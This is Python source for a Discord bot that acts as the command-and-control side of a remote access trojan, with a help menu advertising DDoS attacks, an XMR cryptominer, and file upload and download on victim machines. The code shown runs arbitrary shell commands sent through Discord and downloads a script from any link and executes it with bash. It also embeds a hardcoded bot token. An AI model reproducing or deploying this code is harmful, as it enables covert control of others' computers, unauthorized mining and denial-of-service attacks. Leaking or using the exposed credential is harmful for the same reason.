from keep_alive import keep_alive
from discord.ext import commands
from discord import app_commands
import requests
import discord
import sys
import os

token = 'MTAzNzY3ODcxNTE4MzgyOTA0NA.G8s5qC.Y5Ipx3ddmh78rcmA_UQU5_C3Q-4EyNx9xVRZBU'

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)
bot.remove_command('help')

help_menu = """```
# Bot Commands
* !sessions                   # List open sessions
* !exit                       # Exit session

* !info                       # Give IP information as Json
* !check                      # Check if miner is running or not
* !shell < cmd >              # Run command

* !download < link > < name > # Download file
* !upload < path >            # Upload file
* !update                     # Update RAT

* !sh-update-script < link >  # Update script only on Linux
* !win-update-script < Link > # Update script only on Windows

* !ddos    < ip >             # Start DDoS attack
* !stopddos                   # Stop DDoS attack

* !miner < wallet >           # Start XMR miner
* !stopminer                  # Stop miner
```"""

# log
@bot.event
async def on_ready():
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.playing, name="!help"))
    print(f'{bot.user}')

# help
@bot.command()
async def help(ctx):
    await ctx.send(help_menu)

# clear
@bot.command(aliases=['purge', 'delete'])
async def clear(ctx):
    await ctx.channel.purge(limit=1000000)

# shell
@bot.command(name="s.shell")
async def shell(ctx, *args):
    arguments = ' '.join(args)
    stream = os.popen(arguments)
    output = stream.read()
    
    if sys.getsizeof(output) > 4000:
        await ctx.send("``[+] Server: Command executed (output > limit)``")
    else:
        if sys.getsizeof(output) > 0:
            await ctx.send("``[+] Server: Command executed`` ```{output}```")
        else:
            await ctx.send("``[+] Server: Command executed (no output)``")

# update
@bot.command(name='s.update')
async def update(ctx, arg1, arg2):
    link = ''.join(arg1)
    name = ''.join(arg2)
    
    url = link
    r = requests.get(url, allow_redirects=True)
    open(name, 'wb').write(r.content)
    
    os.popen(f"bash {name}")
    await ctx.send(f"``[+] Server: Script updated``")
    sys.exit()

keep_alive()
bot.run(token)